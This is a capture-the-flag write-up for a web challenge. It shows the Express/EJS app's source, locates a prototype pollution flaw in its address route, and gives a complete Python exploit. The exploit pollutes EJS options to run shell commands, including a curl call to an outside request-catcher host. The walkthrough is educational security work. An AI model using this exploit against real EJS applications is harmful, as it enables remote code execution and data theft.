# Web/Fastest Delivery Service

## Description

No time for description, I had some orders to deliver : D Note: The code provided is without jailing, please note that when writing exploits.

Attachments: [fds-player.zip](./fds-player.zip)

## Challenge Overview

In this challenge we were given an express application that allowed users to place orders for different items.

app.js

```js
const express = require('express');
const bodyParser = require('body-parser');
const session = require('express-session');
const crypto = require("crypto");

const app = express();
const PORT = 3000;

// In-memory data storage
let users = {};
let orders = {};
let addresses = {};

// Inserting admin user
users['admin'] = { password: crypto.randomBytes(16).toString('hex'), orders: [], address: '' };

// Middleware
app.use(bodyParser.urlencoded({ extended: false }));
app.set('view engine', 'ejs');
app.use(session({
    secret: crypto.randomBytes(16).toString('hex'),
    resave: false,
    saveUninitialized: true
}));

// Routes
app.get('/', (req, res) => {
    res.render('index', { user: req.session.user });
});
app.get('/login', (req, res) => {
    res.render('login');
});

app.post('/login', (req, res) => {
    const { username, password } = req.body;
    const user = users[username];

    if (user && user.password === password) {
        req.session.user = { username };
        res.redirect('/');
    } else {
        res.send('Invalid credentials. <a href="/login">Try again</a>.');
    }
});

app.get('/logout', (req, res) => {
    req.session.destroy();
    console.log(req.session)
    res.redirect('/');
});

app.get('/register', (req, res) => {
    res.render('register');
});

app.post('/register', (req, res) => {
    const { username, password } = req.body;

    if (Object.prototype.hasOwnProperty.call(users, username)) {
        res.send('Username already exists. <a href="/register">Try a different username</a>.');
    } else {
        users[username] = { password, orders: [], address: '' };
        req.session.user = { username };
        res.redirect(`/address`);
    }
});

app.get('/address', (req, res) => {
    const { user } = req.session;
    if (user && users[user.username]) {
        res.render('address', { username: user.username });
    } else {

        res.redirect('/register');
    }
});

app.post('/address', (req, res) => {
    const { user } = req.session;
    const { addressId, Fulladdress } = req.body;

    if (user && users[user.username]) {
        addresses[user.username][addressId] = Fulladdress;
        users[user.username].address = addressId;

        res.redirect('/login');
    } else {
        res.redirect('/register');
    }
});



app.get('/order', (req, res) => {
    if (req.session.user) {
        res.render('order');
    } else {
        res.redirect('/login');
    }
});

app.post('/order', (req, res) => {
    if (req.session.user) {
        const { item, quantity } = req.body;
        const orderId = `order-${Date.now()}`;
        orders[orderId] = { item, quantity, username: req.session.user.username };
        users[req.session.user.username].orders.push(orderId);
        res.redirect('/');
    } else {
        res.redirect('/login');
    }
});

app.get('/admin', (req, res) => {
    if (req.session.user && req.session.user.username === 'admin') {
        const allOrders = Object.keys(orders).map(orderId => ({
            ...orders[orderId],
            orderId
        }));
        res.render('admin', { orders: allOrders });
    } else {
        res.redirect('/');
    }
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
```

This was a pretty good challenge. My first thought was that we need to first reach the admin page and then find an SSTI in ejs in order to get the flag. But turns out, even if you reach the admin page an SSTI is not possible. We need a RCE in order to get the flag but nothing really seems out of the ordinary at first in this code. 

But when you look at the  `/address` route carefully, you will find that it is possible to do a protoype pollution here. 

```js
app.post('/address', (req, res) => {
    // Code
        addresses[user.username][addressId] = Fulladdress;
    // Code
});
```

This line is vulnerable to prototype pollution. All the variables in this line, 
* `user.username` - Set during registration
* `addressId` - Provided in POST request
* `Fulladdress` - Provided in POST request

are controlled by the us. Thus we could easily do something like `addresses[__proto__][evil]=value` and infect `Object`. And since this is on the server side, it is possible to obtain RCE using this.

## Exploit

The steps for the prototype pollution are

* Register with the username `__proto__`
* Set `address` in order to pollute `Object`

After looking around for a while, I finally found this [post](https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce) that explained how to obtain RCE using Server Side Prototype Pollution in EJS.

exploit.py

```py
import requests

base_url = 'http://localhost:3000'
session = requests.Session()

def register(username, password):
    url = f'{base_url}/register'
    data = {
        'username': username,
        'password': password
    }
    response = session.post(url, data=data)
    if 'address' in response.url:
        print(f"Registered successfully as {username}")
        return True
    else:
        print(f"Failed to register: {response.text}")
        return False

def add_address(username, addressId, fullAddress):
    url = f'{base_url}/address'
    data = {
        'username': username,
        'addressId': addressId,
        'Fulladdress': fullAddress
    }
    response = session.post(url, data=data)
    if 'login' in response.url:
        print(f"Address added successfully for {username}")
        return True
    else:
        print(f"Failed to add address: {response.text}")
        return False

def login(username, password):
    url = f'{base_url}/login'
    data = {
        'username': username,
        'password': password
    }
    response = session.post(url, data=data)
    if 'login' not in response.url:
        print(f"Logged in as {username}")
        return True
    else:
        print(f"Failed to log in: {response.text}")
        return False

def place_order(item, quantity):
    url = f'{base_url}/order'
    data = {
        'item': item,
        'quantity': quantity
    }
    response = session.post(url, data=data)
    if 'order' not in response.url:
        print("Order placed successfully")
        return True
    else:
        print(f"Failed to place order: {response.text}")
        return False

def view_admin_orders():
    url = f'{base_url}/admin'
    response = session.get(url)
    if response.status_code == 200:
        print("Admin Orders:")
        print(response.text)
    else:
        print("Failed to retrieve orders or unauthorized access")

if __name__ == '__main__':
    register("__proto__", "random")
    add_address("__proto__", "client", "1")
    cmd = "curl https://dragon.requestcatcher.com/hacked"
    add_address("__proto__", "escapeFunction", "JSON.stringify; process.mainModule.require('child_process').exec('" + cmd + "')")

    view_admin_orders()
```

The above script pollutes the `__proto__` and sets `client` and `escapeFunction` with values that allows us to execute commands whenever ejs renders the page, effectively giving us Remote Code Execution. Now we can simply use `ls` and then `cat flagfile` to obtain our flag.